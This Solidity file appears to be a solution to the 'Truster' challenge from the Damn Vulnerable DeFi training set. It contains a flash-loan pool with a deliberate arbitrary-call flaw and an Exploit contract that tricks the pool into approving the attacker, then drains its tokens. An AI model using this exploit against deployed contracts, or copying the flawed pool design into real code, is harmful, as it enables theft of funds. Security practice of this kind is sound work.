// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

contract DamnValuableToken is ERC20 {
    constructor() ERC20("DamnValuableToken", "DVT", 18) {
        _mint(msg.sender, type(uint256).max);
    }
}

contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}

contract Exploit {
    TrusterLenderPool public trusterLenderPool;
    DamnValuableToken public dvt;

    constructor(TrusterLenderPool _trusterLenderPool, DamnValuableToken _dvt) {
        trusterLenderPool = _trusterLenderPool;
        dvt = _dvt;
    }

    function exploit() public {
        uint256 approveAmount = 1_000_000 ether;
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), approveAmount);
        trusterLenderPool.flashLoan(0 ether, address(this), address(dvt), data);
        dvt.transferFrom(address(trusterLenderPool), msg.sender, approveAmount);
    }
}
